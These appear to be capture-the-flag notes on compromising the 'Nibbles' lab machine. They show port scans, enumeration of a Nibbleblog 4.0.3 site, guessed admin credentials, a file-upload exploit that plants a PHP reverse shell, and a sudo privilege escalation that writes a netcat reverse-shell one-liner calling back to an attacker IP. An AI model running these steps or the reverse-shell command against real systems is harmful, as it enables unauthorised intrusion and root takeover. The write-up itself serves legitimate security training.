# nibbles

### nmap

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

### dir enum

```
http://10.10.10.75/nibbleblog/admin.php -> login page

http://10.10.10.75/nibbleblog/content/ -> files

http://10.10.10.75/nibbleblog/install.php -> Blog already installed... May be you want to update ? -> http://10.10.10.75/nibbleblog/update.php

http://10.10.10.75/nibbleblog/plugins/ -> plugines files

http://10.10.10.75/nibbleblog/sitemap.php/

http://10.10.10.75/nibbleblog/update.php/

http://10.10.10.75/nibbleblog/README
	-> Version: v4.0.3
	-> Codename: Coffee

# upload dir
http://10.10.10.75/nibbleblog/content/public/upload/
```

### Goodies

```bash
# brute force with random ip
User: admin
Password: nibbles
```

### Exploitation

```bash
# found public explit
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)  | php/remote/38489.rb

# upload php-reverse-shell.php
http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image

# active shell 
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
```

### Post Enum

```bash
# runable program as root
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 /home/nibbler/personal/stuff/monitor.sh

```

### Priv Esc

```bash
# modify shell script and get shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 10000 >/tmp/f" > /home/nibbler/personal/stuff/monitor.sh
```
